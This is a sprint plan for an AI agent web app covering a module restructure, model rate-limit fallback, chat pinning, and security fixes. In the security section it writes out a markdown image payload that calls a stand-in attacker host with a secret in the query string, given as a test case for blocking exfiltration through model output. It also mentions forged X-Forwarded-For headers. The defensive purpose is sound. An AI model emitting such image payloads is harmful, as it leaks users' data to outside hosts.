# Sprint 2026-10-25 plan

Product owner: `product-owner`. Sprint branch: `sprint-2026-10-25` (base `4923785`).
Point target 21 (19–23). **Planned: 22 points** in 4 features, plus 5 stretch points.

## Sprint goal

Restructure `wcl_agent/` into sub-packages now, while it is still small. Every later
agent feature (playbooks, sub-agents, search, upload ingest, the stored-data tools)
then lands in the new layout and doesn't have to be moved later. On top of the
restructure, ship the work the owner feels every day: the app keeps answering when
a model is rate limited, it starts serving without waiting for model discovery, and
the sidebar gets pinned chats with generated names. Also close the two open
medium-severity security findings.

## Tracks at a glance

| Order | Track A (agent / model layer) | Track B (UI, conversations, auth) |
|---|---|---|
| 1st | **F1** Restructure `wcl_agent` (5) | **F4** Security hardening (4) |
| 2nd | **F3** Model resilience (6), after F1 | **F2** Sidebar & conversations (7), rebased on F1 |
| Stretch | **F5** Fetch persistence foundation (4), after F1 | sc-152 font size (1) |
| Total | 11 (+4) | 11 (+1) |

Merge rule: **F1 merges into the sprint branch first, as soon as it is accepted.** Any
feature branch that is open when F1 lands rebases onto it before its own merge. Track B
starts with F4 on purpose: F4 doesn't touch `wcl_agent` at all, so it runs safely
alongside the restructure. F2 (which imports the LLM helpers) starts after that, by
which point F1 should be merged or close to it.

Migration numbers: the latest is `0011_guide_content_types`. **F2 owns `0012`**, and F5
(stretch) takes `0013`. Whichever merges second renumbers its `down_revision` if needed.

---

## F1 — Restructure `wcl_agent/*.py` into sub-packages (Track A, first)

- **Stories:** sc-150 (5) Restructure wcl_agent/*.py into sub-packages.
- **Complexity:** medium. The work is mechanical, but the blast radius is wide: 25
  modules (7 kLOC), 69 backend files import from `wcl_agent` (45 of them tests), and
  about 10 tests patch dotted `"wcl_agent.x.y"` strings.
- **Footprint:** `wcl_agent/**`, the import lines of `backend/**` (app and tests),
  `main.py`, `pyproject.toml` (the `wcl` script entry, if `cli` moves), and
  `documentation/ai_guide.md` (module map).
- **Depends on:** nothing. **Blocks:** F3, F5, and every future agent story.
- **Acceptance criteria:**
  1. The modules are grouped into sub-packages along the story's lines (client, tools,
     guides, cache, models; the developer picks the final names and records the
     old-to-new mapping table in the spec). Package names must not shadow each other
     or the existing module names: for example, a `cache/` package can't sit next to
     `cache.py`.
  2. Files are moved with `git mv`, so `git log --follow` keeps their history.
  3. **No compatibility shims** are left at the old paths (constitution I, one
     authoritative implementation). Every importer is updated, including the dotted
     strings that `monkeypatch`/`mock.patch` use, and lazy imports inside functions.
  4. There is no behaviour change. The full backend test suite gives the same
     pass/fail/skip counts as at base `4923785` (record the baseline first).
  5. Every module imports cleanly. A smoke test (or a one-off script whose output goes
     in the PR notes) imports every `wcl_agent` submodule and `backend.app.main`, and
     reports no errors.
  6. `uv run wcl --help` (the console script) and `python main.py --help` still work.
     The backend container image builds, and the app boots locally to `ready` on
     `/api/health`.
  7. `documentation/ai_guide.md` and any other module map or path reference in
     docs/README match the new layout. Historical `specs/0xx` files are left alone.
  8. The diff contains moves and import edits only, with no opportunistic refactors.
     Anything worth changing gets noted for the backlog instead.

## F4 — Security hardening: remote images + per-client login limit (Track B, first)

- **Stories:** sc-157 (2) QA SEC-003: block remote images in model output; sc-158 (2) QA
  SEC-004: per-client login rate limit behind proxy.
- **Complexity:** low–medium.
- **Footprint:** `frontend/src/components/StreamMarkdown.tsx` (Streamdown `harden`
  options), `frontend/nginx.conf` (CSP and forwarded headers), `frontend/vite.config.ts`
  (dev proxy), `backend/app/api/auth.py` (`_source_key`),
  `backend/app/services/auth_service.py`, `backend/app/auth/rate_limit.py`,
  `backend/app/config.py`, `backend/Dockerfile` CMD, `docker-compose.yml`. Source
  findings: `qa-reports/2026-10-18-2106/security.md` SEC-003 and SEC-004, in the
  owner's checkout `/home/rudolf/dev/warcraftlogs-agent/qa-reports/`.
- **Depends on:** nothing. Disjoint from F1.
- **Acceptance criteria:**
  1. Markdown in chat replies and guides never makes the browser fetch a remote image.
     `![x](https://attacker.example/?q=secret)` renders as a plain link or a "remote
     image blocked" placeholder, and no network request goes out. A frontend test
     covers this (renderer config, or a rendered-output assertion).
  2. The app's own images keep working: background art, Plotly artifacts, and any
     same-origin, `data:` or `blob:` images the app produces.
  3. `frontend/nginx.conf` sends a Content-Security-Policy whose `img-src` is limited to
     `'self' data: blob:`, and which doesn't break the app (check script, style, font
     and connect sources against the running app, including the WebSocket and Google
     Fonts if used).
  4. Links in model output stay clickable, for `http(s)` only.
  5. Behind the trusted proxy, the login and token-endpoint limiters key on the real
     client IP. Uvicorn runs with proxy headers on and a configurable trusted-proxy
     list (a setting with a safe default, documented in `.env.example` or the README).
     nginx and the Vite dev proxy forward the client address.
  6. Backend tests: two clients with different forwarded IPs from a trusted proxy get
     separate buckets, so one locking out doesn't lock out the other. An
     `X-Forwarded-For` sent from an untrusted peer is ignored, so it can't be used to
     dodge the limit.

## F3 — Model resilience: 429 fallback + non-blocking discovery (Track A, after F1)

- **Stories:** sc-156 (2) QA PERF-001: don't block startup on model discovery; sc-159 (1)
  QA SPEC-002/004: startup log line + empty catalog handling; sc-164 (3) Fall back to the
  second model in the same class on 429s.
- **Why bundled:** all three touch the same files: model discovery and the model set
  (`backend/app/main.py` `_load_models`, `backend/app/startup.py`,
  `backend/app/model_state.py`, `wcl_agent` `models`/`vertex`), plus the retry layer
  (`wcl_agent` `model_retry`, `backend/app/agent_runner.py`, `backend/app/api/ws.py`).
  One developer owns the whole area.
- **Complexity:** high (sc-164: switching model mid-turn with ADK and Anthropic).
- **Footprint:** as above, plus a small frontend notice (`frontend/src/App.tsx` or
  `StatusAlert.tsx`, `types.ts`) if a new event type is added. Source findings:
  `qa-reports/2026-10-18-2106/performance.md` PERF-001 and `spec-conformance.md`
  SPEC-002/SPEC-004.
- **Depends on:** F1 (uses the new module paths).
- **Acceptance criteria:**
  1. *(sc-156)* The `ReadinessGate` no longer waits for the `models` boot step.
     Non-health HTTP requests and WebSocket chats are served while discovery runs,
     using the static fallback model set. When discovery finishes, `get_model_state`
     and `/api/models` switch to the discovered set without a restart. A test with
     discovery stubbed to hang proves the app serves requests.
  2. *(sc-156)* A chat started on a fallback model that discovery then drops keeps
     working, or falls back to the new default with a notice. It never returns a 500
     or closes the socket.
  3. *(sc-159)* A successful boot logs one INFO summary line with the model count and
     the source (catalog / static / degraded, plus "cached" when it came from the
     cache), as FR-023 and quickstart §2 of spec 016 require.
  4. *(sc-159)* A 200 catalog response without the `publisherModels` key raises
     `CatalogUnavailable`, so the static fallback runs. A `{}` body test is added
     next to the existing malformed-body tests.
  5. *(sc-164)* When a chat turn's model is still rate limited after the existing
     retry policy, the turn retries once on the other discovered model of the same
     class. Gemini classes offer two versions. If the turn is already on the second
     model, it switches back to the first.
  6. *(sc-164)* If both models of the class are rate limited, or the class has only
     one model (Claude classes today), the user gets a clear in-chat message to try
     again shortly. The agent loop and the socket survive, and the next message works.
  7. *(sc-164)* The user can see which model answered when a switch happened (a notice
     in the chat). The fallback doesn't loop: at most one switch per attempt.
  8. Tests cover these paths with fake 429 errors, for both the Gemini and the
     Anthropic call paths. No live Vertex call is needed in CI.

## F2 — Sidebar & conversations: order, pinning, generated names (Track B, after F4)

- **Stories:** sc-154 (1) Sidebar: previous conversations above Raids; sc-165 (3)
  Pinnable chats in chat window and sidebar; sc-155 (3) Auto-generate conversation names.
- **Why bundled:** all three change `Sidebar.tsx` and the conversations API and model.
- **Complexity:** medium.
- **Footprint:** `frontend/src/components/Sidebar.tsx`, `frontend/src/App.tsx`, the chat
  header (in `App.tsx`/`MessageList.tsx`), `frontend/src/types.ts`,
  `frontend/src/api/restClient.ts`, `backend/app/api/conversations.py`,
  `backend/app/db/models.py` (`Conversation`), `backend/app/db/repository.py` (title
  logic around line 130), new migration `0012_*`, the WS/turn completion hook in
  `backend/app/api/ws.py` or `agent_runner.py`, and a small title-generation service
  under `backend/app/services/`.
- **Depends on:** rebase on F1 before merging (the title generator imports the
  `wcl_agent` model helpers).
- **Acceptance criteria:**
  1. *(sc-154)* The Conversations section is above the Raids section in the sidebar.
     Both keep their collapse toggles and counts.
  2. *(sc-165)* The user can pin and unpin a chat from its sidebar entry and from the
     open chat's header. Pinned chats appear in a "Pinned" group at the top of the
     conversation list, and the state survives a reload and a re-login.
  3. *(sc-165)* Pinning is stored server side (`pinned_at` nullable column, migration
     `0012`, upgrade and downgrade both work). It goes through a tenant-scoped API
     (for example `PATCH /api/conversations/{id}`) that respects tenancy/RLS: pinning
     another tenant's conversation returns 404. Backend tests cover this.
  4. *(sc-155)* After the first complete assistant reply in a conversation that still
     has the default name (the first-message excerpt or "New chat"), the server
     generates a short title (at most 60 characters, plain text, no quotes or
     markdown) from the first exchange, with a lightweight model through the existing
     retry and rate-limit helpers.
  5. *(sc-155)* Title generation runs off the chat path. It never delays or blocks the
     reply stream, and it happens at most once per conversation. If it fails or hits a
     429, the current first-message title stays. Nothing errors to the user.
  6. *(sc-155)* A conversation created with an explicit title (raid investigations,
     recent-raid kickoffs) keeps it.
  7. *(sc-155)* The sidebar shows the new title without a manual reload (WS event or
     list refetch).
  8. Backend tests cover generation, the once-only rule, the explicit-title rule and
     the failure fallback, with the model faked.

## Stretch (pull in only if both tracks are on schedule)

### F5 — Fetch persistence foundation (after F1, whichever track frees first)

- **Stories:** sc-127 (2) Raw WCL fetch schema; sc-128 (2) Write-through persistence of
  every WCL fetch. These open epic 103 ("Every fetch stored in the DB"), which is the
  foundation for epics 100 (semantic search) and 106 (Raids page data), and for
  sc-129/130/131. Data starts building up from the day this ships, which is why it
  heads the next sprint if it doesn't fit here.
- **Complexity:** medium. **Footprint:** `wcl_agent` client/cache (new paths after F1),
  `backend/app/db/models.py`, migration `0013`, `backend/app/db/repository.py`.
- **Acceptance criteria:** (1) migration `0013` creates a raw-fetch table (query key,
  operation name, params JSONB, report code (nullable, indexed), fetched_at, payload
  JSONB), and upgrade/downgrade work. (2) Every successful GraphQL response through the
  single WCL client is persisted without blocking the tool call (off the event loop,
  bounded), and persistence errors are logged, never raised to the agent.
  (3) Repeated identical fetches of a finished report upsert instead of piling up
  duplicates. (4) The table is global, not tenant-scoped, matching the shared Redis
  WCL cache from feature 014 (Warcraft Logs data is public). (5) Tests cover the
  write-through, the error isolation and the upsert.

### sc-152 (1) — Slightly increase default font size

Track B filler. The base font size goes up one step in `frontend/src/index.css` or
`styles.css`, with no layout overflow in the sidebar, composer or welcome panel at
1280px and 390px widths.

---

## Risks, and what to drop first

| Risk | Mitigation |
|---|---|
| F1 conflicts with every other branch | Merge F1 first. Track B starts with F4, which is disjoint from F1. Open branches rebase on F1 right after it lands. |
| F1 breaks imports the tests don't reach (lazy imports, dotted patch strings, ADK/Alembic config, Dockerfile) | AC 3–6: import smoke test, boot to ready, console script, image build. |
| The GitNexus index (built from the owner's checkout) goes stale for `wcl_agent` paths after F1 | After F1 merges, developers re-run `node .gitnexus/run.cjs analyze --index-only` in their worktree, or confirm `wcl_agent` paths by text search. |
| sc-164: ADK binds the model to the agent, so a mid-turn switch may be awkward | The developer may implement the fallback at the turn level (re-run the turn on the sibling model) instead of per request, as long as AC 5–7 hold. |
| Vertex credentials may be expired on this host, so there are no live model calls | All model behaviour is tested with fakes (F3 AC 8, F2 AC 8). The owner tests sc-155/164 live. |
| Two migrations in parallel | F2 owns `0012`, F5 owns `0013`. |

**Drop order if the sprint runs late:** (1) the stretch items, F5 and sc-152, if not
started; (2) sc-155 from F2 (3 points; 154 and 165 still ship); (3) sc-164 from F3
(3 points; 156 and 159 still ship). F1 and F4 are not dropped.

---

## Full ranked backlog (all 49 open stories)

The 4 PDF stories already Under Review (sc-108/109/110/169) are excluded; they're
waiting for the owner's live test. Shortcut Priority mirrors this ranking: Highest =
sprint, High = stretch/next up, Medium = next sprints, Low = later, Lowest = long term.

| # | Story | Pts | Priority | Rationale |
|---|---|---|---|---|
| 1 | sc-150 Restructure wcl_agent into sub-packages | 5 | Highest | Foundation: every later agent story lands in the new layout, and moving 7 kLOC only gets dearer. |
| 2 | sc-157 QA SEC-003 block remote images | 2 | Highest | Open security finding, disjoint from F1, so Track B can start at once. |
| 3 | sc-158 QA SEC-004 per-client login limit | 2 | Highest | Open security finding, and a precondition for any shared deployment (sc-146). |
| 4 | sc-156 QA PERF-001 don't block on discovery | 2 | Highest | Same files as sc-164; one developer owns the model layer. |
| 5 | sc-159 QA SPEC-002/004 log line + empty catalog | 1 | Highest | Same files as sc-156, cheapest while that code is open. |
| 6 | sc-164 429 fallback to the sibling model | 3 | Highest | Daily pain (stalled chats). Builds on the discovered model classes. |
| 7 | sc-154 Sidebar: conversations above Raids | 1 | Highest | Same component as sc-165, nearly free inside F2. |
| 8 | sc-165 Pinnable chats | 3 | Highest | Daily-use value; shares sidebar, API and model with sc-155. |
| 9 | sc-155 Auto-generate conversation names | 3 | Highest | Makes old chats findable; pairs with pinning. |
| 10 | sc-127 Raw WCL fetch schema | 2 | High | Stretch. Epic 103 foundation; stored data compounds from the day it ships. |
| 11 | sc-128 Write-through persistence | 2 | High | Stretch, with sc-127. Epics 100 and 106 and sc-129..132 all build on it. |
| 12 | sc-152 Larger default font | 1 | High | Stretch filler, trivial and isolated. |
| 13 | sc-129 DB-first reads with freshness rules | 5 | High | First user-visible payoff of epic 103. Needs sc-127/128. |
| 14 | sc-163 Agent research playbooks | 5 | High | Big quota and latency win. Lands in the restructured agent and can use sc-129 reads. |
| 15 | sc-153 Welcome: 6 raids + 6 M+ runs | 3 | High | Owner-visible. Should follow sc-128, so the new M+ fetches get stored. |
| 16 | sc-146 Deployment / hosting plan | 5 | High | Owner's first todo item. Doc-only, so it fits anywhere. Better once SEC-004 (proxy) and the data layer are settled. |
| 17 | sc-130 Normalize key WCL entities | 5 | Medium | Needs the raw fetches (127/128). The Raids page and the query tools read from it. |
| 18 | sc-141 Raids page: tabs | 2 | Medium | Do epic 106 as one feature (141/142/143), after sc-130. |
| 19 | sc-142 Raids page: previously pulled data | 5 | Medium | Built before sc-130 it would be rewritten against the normalized tables. |
| 20 | sc-143 Raids page: "Analyze this raid" button | 1 | Medium | Same component as sc-141/142. |
| 21 | sc-131 Agent tools to query stored data | 5 | Medium | After sc-130, in the restructured tools package. |
| 22 | sc-132 Local-answer hit-rate metric | 2 | Medium | Measures sc-129/131, so it comes after them. |
| 23 | sc-149 Agent skills for judging WoW numbers | 5 | Medium | Complements sc-163 (fetching vs judging). Prompt/skill work in the new layout. |
| 24 | sc-137 Design single-lane chat layout | 2 | Medium | Must precede sc-138 and needs the owner's review of the mockup. |
| 25 | sc-138 Implement single-lane chat layout | 5 | Medium | Rebuilds the chat window, so chat-window features (139, 140, 144, 118) come after it. |
| 26 | sc-139 Message actions in the new layout | 2 | Medium | Part of the redesign. |
| 27 | sc-140 Scroll to question on completion | 1 | Medium | Do it in the new layout, or it gets written twice. |
| 28 | sc-144 Character filter checkboxes | 5 | Medium | Lives in the chat header, so after the redesign. |
| 29 | sc-145 (Stretch) Agent sets the character filter | 5 | Low | Needs sc-144. |
| 30 | sc-166 Onboarding: new accounts to profile | 2 | Low | Epic 162 as one feature. It matters once other people sign up (after sc-146). |
| 31 | sc-167 Onboarding: main class/spec + content | 3 | Low | Same epic; sc-168 depends on it. |
| 32 | sc-168 Onboarding: background guide generation | 2 | Low | Reuses feature 015's background pipeline. Needs sc-167. |
| 33 | sc-147 Confirm browser cache usage | 2 | Low | Investigation. Worth more once sc-129 settles the server-side cache layers. |
| 34 | sc-111 pgvector setup | 2 | Low | Epic 100 embeds stored data, so it needs epic 103 first. |
| 35 | sc-112 Embed fetched data on write | 3 | Low | Hooks into sc-128's write path. |
| 36 | sc-113 Backfill embeddings | 2 | Low | After sc-112. |
| 37 | sc-114 Parallel semantic search tool | 3 | Low | After sc-111..113. |
| 38 | sc-115 Search-first prompting + eval | 2 | Low | After sc-114; overlaps the sc-163 playbooks. |
| 39 | sc-116 Spin up sub-agent tool | 5 | Low | Needs the restructured agent; otherwise independent. |
| 40 | sc-117 Sub-agent guardrails | 2 | Low | Ships with sc-116, sharing the rate limiter that sc-164 touches. |
| 41 | sc-118 Sub-agent progress in the UI | 2 | Low | Chat UI, so after the redesign (sc-138). |
| 42 | sc-123 Spike: define log upload scope | 2 | Low | Gates the rest of epic 102. |
| 43 | sc-124 Log upload endpoint and storage | 2 | Low | After the spike. |
| 44 | sc-125 Log upload UI with progress | 2 | Low | After sc-124. |
| 45 | sc-126 Ingest uploaded logs for the agent | 5 | Low | Ingests into the stored-fetch shape (127/130), so after them. |
| 46 | sc-119 (Long term) Sandboxed execution service | 5 | Lowest | Long term; only needed for the REPL. |
| 47 | sc-120 (Long term) REPL tool for sub-agents | 5 | Lowest | Needs sc-116 and sc-119. |
| 48 | sc-121 (Long term) Load log data into the REPL | 2 | Lowest | Needs sc-120 and the stored data. |
| 49 | sc-122 (Long term) Sandbox security review | 2 | Lowest | Gates shipping sc-119/120. |
